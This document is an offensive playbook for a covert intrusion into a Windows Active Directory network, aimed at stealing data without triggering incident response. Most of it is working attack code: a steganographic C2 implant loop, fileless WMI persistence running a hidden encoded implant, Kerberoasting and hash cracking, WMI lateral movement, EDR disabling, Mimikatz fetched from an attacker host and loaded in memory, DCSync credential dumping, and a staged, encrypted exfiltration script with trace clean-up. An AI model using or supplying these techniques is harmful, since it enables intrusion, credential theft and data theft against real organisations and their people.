# Low-noise operation playbook

End-to-end operation from initial access to exfiltration, built around staying below
the detection threshold at every stage. No single step should be the story. The
sequence, executed with discipline, achieves the objective.

## Scope and prerequisites

This playbook assumes:

- An initial foothold via credential theft, phishing, or token replay (no exploit
  required at entry)
- A Windows Active Directory environment as the target
- The objective is data exfiltration without triggering an incident response

Adapt each phase to the specific environment. Test each technique against the target's
specific EDR before deployment, or in a representative lab environment.

## Phase 1: establish a quiet beachhead

Immediately after access, limit activity. Do not enumerate loudly. Do not run tools.
Establish communication and assess the environment.

Sandbox and environment check first:

```powershell
# run sandbox detection before anything else (see sandbox-detection runbook)
# exit silently if analysis environment detected
```

Establish the primary C2 channel via steganographic covert channel rather than a
direct beacon. The implant fetches a generated image from a cloud storage URL and
extracts instructions from it in memory. No outbound connection to an attacker-
controlled domain.

```python
# implant-side C2 polling (see steganography runbooks for full implementation)
import requests, time, random

def poll_c2():
    # fetch image from legitimate cloud storage
    url = 'https://storage.googleapis.com/legitimate-looking-bucket/banner.png'
    img = requests.get(url).content
    # extract and decrypt embedded instruction
    instruction = extract_instruction(img)  # steghide/neural extraction
    return instruction

while True:
    cmd = poll_c2()
    if cmd:
        result = execute(cmd)
        exfil_result(result)
    time.sleep(random.randint(300, 900))  # 5-15 minute jitter
```

Implant persistence via WMI subscription (no registry run key, no scheduled task
visible in Task Scheduler UI):

```powershell
# WMI persistence (fileless, survives reboot, no obvious artefact)
# trigger: every 10 minutes via timer event
$filterArgs = @{
    Name = 'SystemHealthCheck'
    EventNamespace = 'root\cimv2'
    QueryLanguage = 'WQL'
    Query = "SELECT * FROM __InstanceModificationEvent WITHIN 600 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
}
$filter = Set-WmiInstance -Class __EventFilter -Namespace root\subscription -Arguments $filterArgs

$consumerArgs = @{
    Name = 'SystemHealthCheck'
    CommandLineTemplate = 'powershell -w hidden -enc IMPLANT_BASE64'
}
$consumer = Set-WmiInstance -Class CommandLineEventConsumer -Namespace root\subscription -Arguments $consumerArgs

Set-WmiInstance -Class __FilterToConsumerBinding -Namespace root\subscription -Arguments @{
    Filter = $filter; Consumer = $consumer
}
```

## Phase 2: passive reconnaissance

Gather information using built-in tools and legitimate queries. No additional tooling
loaded yet.

```powershell
# domain enumeration using built-in AD cmdlets (available on domain-joined hosts)
# or net commands (no additional tooling required)

# users and groups
net user /domain
net group "Domain Admins" /domain

# hosts
net view /domain
arp -a  # hosts that have communicated recently

# shares (low-noise, looks like normal file access)
net view \\DC_NAME /all

# current user's group memberships
whoami /groups
```

Avoid running SharpHound or BloodHound at this stage. Their activity patterns (many
LDAP queries in rapid succession) are widely detected. If BloodHound data is needed,
use the LDAP collection method with a slow collection interval:

```text
# SharpHound with slow collection to reduce LDAP query rate
Invoke-BloodHound -CollectionMethod All -Throttle 2000 -Jitter 30
```

## Phase 3: lateral movement via credential abuse

Prefer credential replay and pass-the-hash over exploitation. If Kerberoastable service
accounts exist with weak passwords, crack them offline and authenticate normally.

```text
# from domain user context: request and crack service tickets offline
GetUserSPNs.py domain.local/user:password -dc-ip DC_IP -request -outputfile tgs.txt
hashcat -m 13100 tgs.txt wordlist.txt -r best64.rule
```

Use the cracked service account credential for WMI or PSRemoting lateral movement:

```powershell
# WMI lateral movement (uses port 135/dynamic, encrypted, looks like admin activity)
$cred = New-Object System.Management.Automation.PSCredential('domain\svcaccount', $securePass)
Invoke-WmiMethod -ComputerName TARGET -Class Win32_Process -Name Create -ArgumentList 'powershell -enc IMPLANT' -Credential $cred
```

## Phase 4: privilege escalation (if required)

If domain admin is required and service account credentials are insufficient:

Option 1: BYOVD to remove EDR callbacks, then run Mimikatz in memory to harvest
credentials from LSASS.

```powershell
# BYOVD to disable EDR (see byovd runbook)
# then: in-memory Mimikatz via reflective loading
$bytes = (New-Object Net.WebClient).DownloadData('https://attacker.example.com/mimikatz.dll')
[System.Reflection.Assembly]::Load($bytes)
# ... invoke sekurlsa::logonpasswords
```

Option 2: DCSync from a host with replication rights. No LSASS access required.

```text
secretsdump.py domain/user:password@DC_IP -just-dc-user Administrator
```

## Phase 5: data collection

Identify target data. Copy to a staging location using built-in tools.

```powershell
# copy target files using robocopy (standard tool, no malware signature)
robocopy \\TARGET\Share\TargetFolder C:\ProgramData\Staging /e /z /mt:4 /log:NUL

# or xcopy for smaller sets
xcopy /s /e /y \\TARGET\Share\TargetFolder C:\ProgramData\Staging\
```

## Phase 6: exfiltration via steganographic channel

Compress, encrypt, split into chunks, embed in images, upload via normal channels.

```python
import os, zipfile, subprocess

# compress
with zipfile.ZipFile('staging.zip', 'w', zipfile.ZIP_DEFLATED) as zf:
    for root, dirs, files in os.walk('C:/ProgramData/Staging'):
        for file in files:
            zf.write(os.path.join(root, file))

# encrypt
subprocess.run(['openssl', 'enc', '-aes-256-cbc', '-pbkdf2',
                '-in', 'staging.zip', '-out', 'staging.enc',
                '-pass', 'pass:OPERATION_KEY'])

# split into chunks (each fits in one image's steganographic capacity)
subprocess.run(['split', '-b', '50000', 'staging.enc', 'chunk_'])

# embed each chunk in a cover image and upload
for chunk_file in sorted(os.listdir('.')):
    if chunk_file.startswith('chunk_'):
        # embed using steghide or neural method
        # upload to cloud storage API
        pass
```

Upload at low rate: one image per hour maximum. Total exfiltration should not produce
a traffic volume anomaly.

## Phase 7: clean-up

Remove staging files. Clean WMI persistence if operation is complete.

```powershell
# remove staging data
Remove-Item C:\ProgramData\Staging -Recurse -Force
Remove-Item C:\ProgramData\chunk_* -Force

# remove WMI persistence
Get-WMIObject -Namespace root\subscription -Class __FilterToConsumerBinding |
  Where-Object { $_.Filter -like '*SystemHealthCheck*' } | Remove-WmiObject
Get-WMIObject -Namespace root\subscription -Class CommandLineEventConsumer |
  Where-Object { $_.Name -eq 'SystemHealthCheck' } | Remove-WmiObject
Get-WMIObject -Namespace root\subscription -Class __EventFilter |
  Where-Object { $_.Name -eq 'SystemHealthCheck' } | Remove-WmiObject
```

Do not clear event logs. Log clearing is itself a highly visible action that triggers
immediate investigation. Accept that logs exist; the objective is that no individual
log entry rises to the level of an actionable alert.
